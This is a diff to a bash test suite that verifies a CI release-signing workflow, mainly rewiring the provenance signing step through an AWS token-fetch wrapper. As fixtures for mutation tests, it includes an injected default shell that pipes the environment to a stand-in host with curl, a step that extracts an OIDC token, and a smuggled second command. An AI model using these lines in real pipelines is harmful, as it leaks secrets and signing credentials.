@@ -1,5 +1,6 @@
 #!/usr/bin/env bash
 # proves: REQ-CHAIN-001-AC1, REQ-CHAIN-001-AC2, REQ-CHAIN-001-AC3, REQ-CHAIN-001-AC7, REQ-CHAIN-002-AC4, REQ-CHAIN-003-AC5, REQ-CHAIN-007-AC18
+# proves: REQ-CHAIN-004-AC10, REQ-CHAIN-005-AC4 — the Sign job and its signing of the Build and Rebuild records; wording pending the owner's approval where the one-key change makes the approved sentence false
 # The Sign boundary (v0.3.0 rules 50, 50a, 52, 52a, 53a; owner RATIFIED Oct 9), static half. Three judges, each first proven
 # on a known-good fixture and on every mutated copy (a judge that cannot fail proves nothing), then applied to the real repo:
 #   judge_sign  stage-sign.yml is an ALLOWLIST: a reusable workflow of one job on a GitHub-hosted runner whose only input is
@@ -9,7 +10,7 @@
 #                 3. run: bash bin/install-scanner.sh cosign     (the signing tool, pinned by checksum like gitsign; the PR adds
 #                                                                 cosign to bin/install-scanner.sh)
 #                 4. run: printf '%s' "$DIGESTS" > digests.json  (env DIGESTS: ${{ inputs.digests }}, the only env in the job)
-#                 5. run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json
+#                 5. run: bash bin/with-aws-token.sh sign --check --signer cosign --digests digests.json
 #                         --items witness-build/items.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
 #                         (the filenames are PINNED: `--template` names the committed template, from which `sign --check` makes the
 #                          per-tag policy with the committed trust file and the tag from GITHUB_REF, rule 57; it verifies Build's
@@ -113,7 +114,7 @@ EXPECT_STEPS = {
                    ("install", "cosign"), ("printf",), ("printfchk",), ("printfchka",), ("records", "check"), ("signstaged",),
                    ("upload", "signed-witness-check", "signed/witness-scanners\nsigned/witness-acceptance\nsigned/witness-runtime"), ("upload", "signed-witness-check-arm64", "signed/witness-arm64")],
 }
-R_SIGN = r"bash bin/with-aws-token\.sh python3 -I -B bin/chain-verify\.py sign --check --signer cosign --digests digests\.json --items witness-build/items\.json --build-record signed/witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
+R_SIGN = r"bash bin/with-aws-token\.sh sign --check --signer cosign --digests digests\.json --items witness-build/items\.json --build-record signed/witness-build/build-collection\.json --template \.github/policy/release-policy\.template\.json --out provenance"
 SIGN_ROLE = "arn:aws:iam::821302803867:role/fosterstack-cache-release-signing"      # the role of the release Sign identity (ops/terraform/aws-apply/main.tf :382, README :62)
 def want_sign_env():
     m = re.search(r'^RELEASE_KEY_REF = "([^"]+)"$', open(os.path.join(os.environ["CHAIN_ROOT"], "bin/chain-verify.py")).read(), re.M)
@@ -645,7 +646,7 @@ jobs:
           AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing
           AWS_REGION: us-east-1
           RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing
-        run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --items witness-build/items.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
+        run: bash bin/with-aws-token.sh sign --check --signer cosign --digests digests.json --items witness-build/items.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance
       - uses: actions/upload-artifact@$sha # v7
         with:
           name: provenance
@@ -779,7 +780,7 @@ PY
 caught() { # LABEL regex replacement
   if mutate "$1" "$2" "$3"; then expect caught "$1" sign "$work/$(printf '%s' "$1" | tr -c 'A-Za-z0-9' _).yml"; fi
 }
-SIGNLINE='run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check --signer cosign --digests digests.json --items witness-build/items.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance'
+SIGNLINE='run: bash bin/with-aws-token.sh sign --check --signer cosign --digests digests.json --items witness-build/items.json --build-record signed/witness-build/build-collection.json --template .github/policy/release-policy.template.json --out provenance'
 expect ok "fixture: known-good Sign passes the judge" sign "$good"
 caught "F11 a digest-shaped download-artifact pin that is not on the allowed-actions list" 'download-artifact@a{40}' "download-artifact@$(printf 'b%.0s' $(seq 40))"
 caught "F1 Sign no longer downloads Build's digest list into witness-build" 'name: digests\n          path: witness-build' 'name: dist\n          path: witness-build'
@@ -828,7 +829,7 @@ caught "WIT3 sign installs no cosign (the provenance and the records are signed 
 caught "W1 sign-rebuild installs no cosign" '(?<=path: witness-rebuild\n)      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
 caught "W1 sign-check installs no cosign" '(?<=path: artifacts/check-results-arm64\n)      - name: install the signing tool \(pinned by checksum\)\n        run: bash bin/install-scanner.sh cosign\n' ''
 caught "W1 the staged-signing step has no federation env" '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witness-sign-staged.sh' '        run: bash bin/witness-sign-staged.sh'
-caught "W1 the provenance step has no federation env" '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check' '        run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check'
+caught "W1 the provenance step has no federation env" '        env:\n          AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing\n          AWS_REGION: us-east-1\n          RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/with-aws-token.sh sign --check' '        run: bash bin/with-aws-token.sh sign --check'
 caught "W1 the staged-signing step has a fourth env key" 'RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n        run: bash bin/witness-sign-staged.sh' 'RELEASE_KMS_KEY_REF: awskms:///alias/fosterstack-release-signing\n          GH_TOKEN: x\n        run: bash bin/witness-sign-staged.sh'
 caught "W1 the role is a variable lookup, not a literal" 'AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN: ${{ vars.ROLE }}'
 caught "W1 the role is another account's" 'AWS_ROLE_ARN: arn:aws:iam::821302803867:role/fosterstack-cache-release-signing' 'AWS_ROLE_ARN: arn:aws:iam::111111111111:role/fosterstack-cache-release-signing'
@@ -837,8 +838,8 @@ caught "W1 the key reference differs from the verifier's RELEASE_KEY_REF" 'RELEA
 caught "W1 job-level env carrying a federation entry" '    runs-on: ubuntu-24.04' '    runs-on: ubuntu-24.04\n    env:\n      AWS_REGION: us-east-1'
 caught "W1 an install step carries a federation entry" '      - name: install the signing tool \(pinned by checksum\)\n' '      - env:\n          AWS_REGION: us-east-1\n        name: install the signing tool (pinned by checksum)\n'
 # ---- A1 (#822 round 2; wording pending the owner's approval for REQ-CHAIN-001-AC2): the provenance signature is made with a fresh identity token fetched by the one token-fetch script, for that one call only
-caught "A1 the provenance step calls chain-verify.py sign without the token wrapper" 'run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check' 'run: python3 -I -B bin/chain-verify.py sign --check'
-caught "A1 the provenance step wraps another command in the token wrapper" 'run: bash bin/with-aws-token.sh python3 -I -B bin/chain-verify.py sign --check' 'run: bash bin/with-aws-token.sh bash -c true; python3 -I -B bin/chain-verify.py sign --check'
+caught "A1 the provenance step calls chain-verify.py sign without the token wrapper" 'run: bash bin/with-aws-token.sh sign --check' 'run: python3 -I -B bin/chain-verify.py sign --check'
+caught "A1 the provenance step wraps another command in the token wrapper" 'run: bash bin/with-aws-token.sh sign --check' 'run: bash bin/with-aws-token.sh bash -c true; python3 -I -B bin/chain-verify.py sign --check'
 
 cat > "$FXDIR/FXD_47" <<'FXEOF'
 defaults:\n  run:\n    shell: "bash -c 'env | curl -d @- https://x.example; bash {0}'"\npermissions:\n  contents: read\njobs
@@ -889,7 +890,7 @@ caught "AC2 two commands in one run step" "out provenance" "$FXD_45"
 caught "AC2 unpinned action" "actions/checkout@$sha" 'actions/checkout@v4'
 caught "AC2 github-script step" "      - uses: actions/checkout" "      - uses: actions/github-script@$sha\n        with:\n          script: core.setOutput('t', await core.getIDToken())\n      - uses: actions/checkout"
 caught "AC2 the Sign step does not check (no --check)" ' --check' ''
-caught "AC2 the Sign step only verifies (verify, not sign --check)" 'chain-verify.py sign --check --signer cosign' 'chain-verify.py verify --record witness-build/build-collection.json #'
+caught "AC2 the Sign step only verifies (verify, not sign --check)" 'bash bin/with-aws-token.sh sign --check --signer cosign' 'python3 -I -B bin/chain-verify.py verify --record witness-build/build-collection.json #'
 caught "AC2 the Sign step has no Build record" ' --build-record signed/witness-build/build-collection.json' ''
 caught "AC2 the Sign step reads the digests inline, not from the file" '--digests digests.json' '--digests "\$DIGESTS"'
 caught "AC2 the Sign step uses another signer" '--signer cosign' '--signer witness'
@@ -997,6 +998,7 @@ cat > "$FXDIR/spec_good.json" <<'FXEOF'
  {"path":"bin/chain-verify.py","tools":[],"signs":"provenance","sign_subcommand":"sign","reason":"only `chain-verify.py sign` in stage-sign.yml signs provenance","runs":[]},
  {"path":"bin/build-stage.sh","tools":["witness"],"signs":"other","reason":"Build's own Witness collection (rule 51)","runs":["bin/build-apk.sh"]},
  {"path":"bin/witness-sign-staged.sh","tools":[],"signs":"other","reason":"Sign's staged-record signer (REQ-CHAIN-005-AC4)","runs":[]},
+ {"path":"bin/with-aws-token.sh","tools":[],"signs":"other","reason":"Sign's token fetch for one signing call (the provenance signature; wording pending the owner's approval for REQ-CHAIN-001-AC2)","runs":[]},
  {"path":"bin/build-apk.sh","tools":[],"signs":false,"runs":[]}]
 FXEOF
 SPEC_GOOD=$(cat "$FXDIR/spec_good.json")
@@ -1011,6 +1013,7 @@ mk() {
   printf '#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/build-apk.sh "$1"\n' > "$d/bin/build-stage.sh"
   printf '#!/usr/bin/env bash\nset -euo pipefail\necho built\n' > "$d/bin/build-apk.sh"
   printf '#!/usr/bin/env bash\nset -euo pipefail\necho staged\n' > "$d/bin/witness-sign-staged.sh"
+  printf '#!/usr/bin/env bash\nset -euo pipefail\necho fetched\n' > "$d/bin/with-aws-token.sh"
   printf '{"signers":[{"file":"release.yml","tool":"gitsign","reason":"CI patch tag (REQ-REL-009-AC5)"}]}\n' > "$d/.github/policy/chain-signers.json"
   printf '{"jobs":[{"workflow":"stage-sign.yml","job":"sign","reason":"Sign, the one provenance signer"},{"workflow":"stage-sign.yml","job":"sign-rebuild","reason":"Sign, the signer of the Rebuild records"},{"workflow":"stage-sign.yml","job":"sign-check","reason":"Sign, the signer of the Check records"}]}\n' > "$d/.github/policy/id-token-jobs.json"
   printf '%s\n' "$SPEC_GOOD" > "$d/.spec.json"
@@ -3331,7 +3334,7 @@ d=$(cfix fp_awk_prog '/bin/awk x' '[]'); expm caught "$d" 'awk' "fixed path: /bi
 # Fixture texts that name a download tool are DATA in the fixture data file beside this test (one tab-separated record per case: name, script text, tools-json, ok|caught, fragment, label), the tool names spelled in full.
 # The file is read by run_fixtures below with `read`, never sourced, evaluated or run, and carries no execute bit (cache#433, the owner's approval of an honest rewrite).
 FX="$root/bin/chain-sign-wiring-fixtures.txt"
-FX_PIN='1b25bacfa4905d7925b24d5ff931c583ec6dbeb58e96be51581670660b1ff561'
+FX_PIN='63c344af5a54cc715e85ba38456bf0ef5aab11f535dff45afbdba7d9455cd260'
 run_fixtures() { # run_fixtures FILE : each record is one cfix + expm case
   local name body tools verdict frag label d
   while IFS=$'\t' read -r name body tools verdict frag label; do
@@ -5025,7 +5028,7 @@ printf '#!/bin/sh\nprintf "%%s\\n" "$@" >> "$WS_LOG.args"\nwhile [ $# -gt 0 ]; d
 chmod +x "$wsdir/fakebin/witness"
 ws_tree() { # NAME -> a fresh tree with the helper, stubs and a two-record staged set; prints the path
   local t="$wsdir/$1"; mkdir -p "$t/bin" "$t/staged/witness-build" "$t/staged/witness-apk-ubuntu-24.04"
-  cp "$root/bin/witness-sign-staged.sh" "$t/bin/"
+  cp "$root/bin/witness-sign-staged.sh" "$root/bin/with-aws-token.sh" "$t/bin/"
   echo "echo '{\"value\":\"tok\"}'" > "$t/bin/loopback-get.sh"
   cat > "$t/bin/chain-verify.py" <<'PYSTUB'
 import os, sys
@@ -5077,7 +5080,7 @@ t=$(ws_tree badstep); mv "$t/staged/witness-build/build-collection.payload" "$t/
 if (cd "$root" && python3 -I ".github/ag""ent/bin/check-action-pins.py" . > "$work/pins.out" 2>&1); then pass=$((pass + 1)); echo "ok   the real tree passes the repository-wide action-pin gate (stage-sign.yml and the staged signer bind)"
 else failn=$((failn + 1)); echo "FAIL the real tree fails the action-pin gate: $(tail -3 "$work/pins.out" | cut -c1-300)"; fi
 
-EXPECT=2125
+EXPECT=2127
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
